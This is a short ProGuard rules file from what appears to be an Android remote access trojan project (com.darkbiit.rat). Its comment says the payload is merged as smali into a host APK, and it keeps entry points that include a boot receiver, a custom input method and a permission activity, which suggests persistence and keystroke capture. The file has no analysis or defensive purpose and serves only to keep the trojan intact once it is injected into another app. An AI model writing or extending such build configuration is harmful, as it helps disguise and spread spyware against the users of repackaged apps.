# The payload is merged as smali into a host APK, so nothing may be renamed
# or stripped: keep the entry points the merged manifest references.
-keep class com.darkbiit.rat.RatService { *; }
-keep class com.darkbiit.rat.RatProvider { *; }
-keep class com.darkbiit.rat.RatIme { *; }
-keep class com.darkbiit.rat.RatBootReceiver { *; }
-keep class com.darkbiit.rat.RatMainActivity { *; }
-keep class com.darkbiit.rat.RatPermissionActivity { *; }
-keep class com.darkbiit.rat.RatCfg { *; }
-keep class com.darkbiit.rat.** { *; }
-dontobfuscate
